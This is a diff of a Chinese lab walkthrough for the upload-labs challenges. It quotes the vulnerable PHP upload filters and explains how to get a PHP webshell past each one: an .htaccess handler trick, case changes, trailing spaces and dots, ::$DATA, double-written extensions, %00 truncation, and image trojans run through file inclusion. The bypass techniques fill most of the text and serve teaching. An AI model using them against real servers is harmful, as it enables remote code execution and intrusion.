+核心原理：&lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;&lt;FilesMatch&gt; 使用正则表达式来匹配文件名，而 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;SetHandler 用于强制指定匹配文件的处理器。这行内容的意思是：“只有当当前目录下的文件名精确叫做 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;webshell.jpg 时，才激活 PHP 处理器去执行它。” 这种方式隐蔽性极高，不会影响该目录下其他正常图片的显示。
 
 
 先上传配置文件 
@@ -4442,16 +4123,12 @@ AddType application/x-httpd-php .jpg
 http://127.0.0.1/upload/loudong.jpg
 
 
-
 方法二：
 上传文件，bp 抓包
 
 
 
-
 修改，放行
-
-
 
 
 
@@ -4461,7 +4138,6 @@ http://127.0.0.1/upload/loudong.jpg
 
 
 Pass-05-大写1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
@@ -4473,11 +4149,8 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 不可以用.htaccess配置文件
 但是我们发现这里没有大写转小写了，可以用.htaccess配置文件。
 
-
 3、操作
 上传文件，抓包修改
-
-
 
 
 
@@ -4489,7 +4162,6 @@ http://127.0.0.1/upload/202606052057142902.PHP
 
 
 Pass-06-空格1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file,$img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
@@ -4499,12 +4171,10 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 
 无法用.htaccess配置文件
 
-
 我们发现没有$file_ext &#x3D; trim($file_ext); 首尾去空的函数。
 所以可以在后缀后面加空格绕过黑名单的校验。
 3、操作
 上传文件，抓包，修改（加空格）
-
 
 2. 访问：
 http://127.0.0.1/upload/202606052108019520.php
@@ -4512,7 +4182,6 @@ http://127.0.0.1/upload/202606052108019520.php
 
 
 Pass-07- 点1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
@@ -4521,11 +4190,9 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 &quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;
 
 
-
 我们发现没有$file_name &#x3D; deldot($file_name); 删除文件名末尾的点的这个函数了，于是可以再后缀后面加 . 绕过
 3、操作
 上传文件，抓包，修改（加  .  ）
-
 
 
 
@@ -4536,14 +4203,12 @@ http://127.0.0.1/upload/1.php.
 
 
 Pass-08-“::$DATA1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
 分析代码
 
 &quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;
-
 
 
 我们发现没有 $file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext); 去除字符串::$DATA 的函数。
@@ -4553,11 +4218,9 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 
 
 
-
 访问
 
 http://127.0.0.1/upload/202606052118232914.php::$data
-
 
 
 要把::$data 删掉，再次访问。
@@ -4566,14 +4229,13 @@ http://127.0.0.1/upload/202606052118232914.php
 
 
 Pass-09- 点 + 空格 + 点 + 空格1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
 分析代码：和 Pass-04 的区别就是这一关无法用.htaccess配置文件，所以可以使用 Pass-04 的方法二，这里就不再赘述。
 
-Pass-10- 双写1、题目
 
+Pass-10- 双写1、题目
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#x27;上传出错！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
@@ -4581,19 +4243,17 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 
 
 
-
-trim()：接收上传的原始文件名，并去掉首尾的空格。
-str_ireplace()：PHP 中专门用于字符串替换的内置核心函数。只替换一次。
+**trim()**：接收上传的原始文件名，并去掉首尾的空格。
+**str_ireplace()**：PHP 中专门用于字符串替换的内置核心函数。只替换一次。
 补充：区分
-str_replace()：大小写敏感。如果开发者用了这个函数，并且黑名单里只有 &quot;php&quot;，根本不需要用 pphphp 这种复杂的双写。直接传 webshell.PhP 就可以，因为小写的 php 根本匹配不到大写的 PhP。
-str_ireplace()：大小写不敏感。遇到它，大小写混淆战术彻底失效（比如 .PhP 也会被它揪出来删掉），这时候就只能pphphp 双写嵌套
+**str_replace()**：大小写敏感。如果开发者用了这个函数，并且黑名单里只有 &quot;php&quot;，根本不需要用 pphphp 这种复杂的双写。直接传 webshell.PhP 就可以，因为小写的 php 根本匹配不到大写的 PhP。
+**str_ireplace()**：大小写不敏感。遇到它，大小写混淆战术彻底失效（比如 .PhP 也会被它揪出来删掉），这时候就只能pphphp 双写嵌套
 
 
 
 在这段代码中，如果存在于黑名单，会被替换成空格。由于只替换一次，所以可以双写
 3、操作
 上传文件。bp 抓包，修改
-
 
 
 
@@ -4604,14 +4264,13 @@ http://127.0.0.1/upload/1.php
 
 
 Pass-11-%00 截断1、题目
-
 2、解题思路
 分析源代码：
 白名单校验：只允许上传 jpg、png、gif
 对文件的保存路径（  $_GET[‘save_path’]   ）可控，没有做过滤，直接信任拼接。
 
 
-%00 截断的作用机制 ，是让底层函数遇到空字符（Null Byte）时以为字符串已经结束，从而强制丢弃了 %00 之后由服务器强制拼接的”随机数字、时间戳以及合法的 .jpg 后缀”。
+%00 截断的作用机制 ，是让底层函数遇到空字符（Null Byte）时以为字符串已经结束，从而强制丢弃了 **%00** 之后由服务器强制拼接的“随机数字、时间戳以及合法的 .jpg 后缀”。
 
 3、操作：
 上传一句话木马（1.php）
@@ -4624,15 +4283,12 @@ http://127.0.0.1/upload/1.php
 
 
 
-
-
 为什么这里我访问图片地址却无法显示呢？
 
 
-
 因为我们使用了%00 截断，因此 jpg 图片根本就不存在
-Pass-12-%00 截断1、题目
 
+Pass-12-%00 截断1、题目
 2、解题思路和 Pass11 的区别在于，Pass12 对文件的保存路径是 $_POST[‘save_path’]   
 依旧用%00 截断方法
 3、操作：
@@ -4644,10 +4300,7 @@ Pass-12-%00 截断1、题目
 
 
 
-
 Pass-13-图片马1、题目
-
-
 
 function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);        $fileType = &#x27;&#x27;;        switch($typeCode)&#123;              case 255216:                        $fileType = &#x27;jpg&#x27;;            break;        case 13780:                        $fileType = &#x27;png&#x27;;            break;                case 7173:                        $fileType = &#x27;gif&#x27;;            break;        default:                        $fileType = &#x27;unknown&#x27;;        &#125;            return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123;    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];    $file_type = getReailFileType($temp_file);    if($file_type == &#x27;unknown&#x27;)&#123;        $msg = &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;&#125;
 
@@ -4673,9 +4326,7 @@ function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&
 
 
 
-
 使用文件包含漏洞，把图片马当作代码来执行。
-
 
 
 
@@ -4687,26 +4338,24 @@ http://127.0.0.1/include.php?file=upload/5120260603104828.png
 
 Pass-14-图片马1、题目
 
-
-
 function isImage($filename)&#123;    $types = &#x27;.jpeg|.png|.gif&#x27;;    if(file_exists($filename))&#123;        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext)&gt;=0)&#123;            return $ext;        &#125;else&#123;            return false;        &#125;    &#125;else&#123;        return false;    &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123;    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];    $res = isImage($temp_file);    if(!$res)&#123;        $msg = &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;&#125;
 
 2、解题思路
 分析源代码
 这段代码放弃了自己去读底层字节，而是调用了 PHP 内置的专业图像处理函数。核心防线有三道：
-getimagesize() 函数不仅会读取文件头（Magic Bytes），还会去解析图像的完整结构（长、宽、MIME 类型等）。如果随便拿个 .php 文件硬改后缀成 .jpg，或者用 010 Editor 只加两个字节的伪造头，在面对严格配置的 getimagesize() 时，极有可能会被直接识破并返回 false。
+**getimagesize()** 函数不仅会读取文件头（Magic Bytes），还会去解析图像的完整结构（长、宽、MIME 类型等）。如果随便拿个 .php 文件硬改后缀成 .jpg，或者用 010 Editor 只加两个字节的伪造头，在面对严格配置的 getimagesize() 时，极有可能会被直接识破并返回 false。
 image_type_to_extension()是将一个 PHP 内部的“图像类型常量（整型 ID）”翻译成标准的“文件后缀名字符串”。
 
 
 
 $info = getimagesize($filename);$ext = image_type_to_extension($info[2]);
 
-当 getimagesize() 成功扫描完一张合法图片后，它会返回一个数组。这个数组的索引 [2]存放的就是代表图像真实类型的整型 ID（也就是 IMAGETYPE_XXX 常量）。
+当 getimagesize() 成功扫描完一张合法图片后，它会返回一个数组。这个数组的**索引 ****[2]**存放的就是代表图像真实类型的整型 ID（也就是 IMAGETYPE_XXX 常量）。
     * 如果扫描的是 **JPG**：`$info[2]` 的值是 `2`。
     * 如果扫描的是 **PNG**：`$info[2]` 的值是 `3`。
     * 如果扫描的是 **GIF**：`$info[2]` 的值是 `1`。
 
-紧接着，把这个查出来的数字 2，塞给了 image_type_to_extension(2)。 这个函数一查内部字典，发现 2 对应的是 JPEG，于是直接吐出字符串 &#39;.jpeg&#39;。
+紧接着，把这个查出来的数字 2，塞给了 image_type_to_extension(2)。 这个函数一查内部字典，发现 2 对应的是 JPEG，于是直接吐出字符串 **&#39;.jpeg&#39;**。
 4.  文件保存路径不可控
 
 3、操作
@@ -4715,9 +4364,7 @@ $info = getimagesize($filename);$ext = image_type_to_extension($info[2]);
 
 
 
-
 使用文件包含漏洞，把图片马当作代码来执行。
-
 
 
 
@@ -4728,8 +4375,6 @@ http://127.0.0.1/include.php?file=upload/3520260603113051.png
 
 
 Pass-15-图片马1、题目
-
-
 
 function isImage($filename)&#123;    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) &#123;        case IMAGETYPE_GIF:            return &quot;gif&quot;;            break;        case IMAGETYPE_JPEG:            return &quot;jpg&quot;;            break;        case IMAGETYPE_PNG:            return &quot;png&quot;;            break;            default:            return false;            break;    &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123;    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];    $res = isImage($temp_file);    if(!$res)&#123;        $msg = &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;&#125;
 
@@ -4746,9 +4391,7 @@ exif_imagetype() 只检查文件头的前几个字节
 
 
 
-
 使用文件包含漏洞，把图片马当作代码来执行。
-
 
 
 
@@ -4760,8 +4403,6 @@ http://127.0.0.1/include.php?file=upload/1220260603114237.png
 
 Pass-16 -二次渲染1、题目
 
-
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123;    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];    $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);    // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,&quot;.&quot;),1);    //判断文件后缀与类型，合法才进行上传操作    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是jpg格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.jpg&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是png格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.png&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是gif格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.gif&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else&#123;        $msg = 